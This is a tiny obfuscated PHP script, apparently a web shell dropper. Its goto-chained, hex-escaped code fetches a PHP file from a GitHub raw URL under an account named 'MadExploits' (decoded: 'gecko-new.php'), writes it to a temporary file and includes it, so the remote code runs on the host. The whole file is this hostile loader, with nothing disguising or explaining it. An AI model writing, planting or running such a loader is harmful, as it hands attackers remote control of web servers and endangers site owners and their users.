<?php

goto sHNkh; sHNkh: $EnoeA = tmpfile(); goto uTcE6; uTcE6: $UmXGi = fwrite($EnoeA, file_get_contents("\x68\164\x74\x70\163\72\x2f\57\x72\141\x77\x2e\x67\151\164\150\x75\x62\165\x73\x65\162\143\x6f\x6e\x74\x65\x6e\164\x2e\x63\x6f\155\x2f\115\x61\x64\105\170\160\x6c\157\151\x74\x73\x2f\x47\145\x63\153\157\x2f\155\x61\x69\x6e\x2f\x67\145\143\x6b\x6f\x2d\x6e\145\x77\x2e\160\150\160")); goto xa01q; xa01q: include stream_get_meta_data($EnoeA)["\165\x72\x69"]; goto Lg1o1; Lg1o1: fclose($EnoeA);
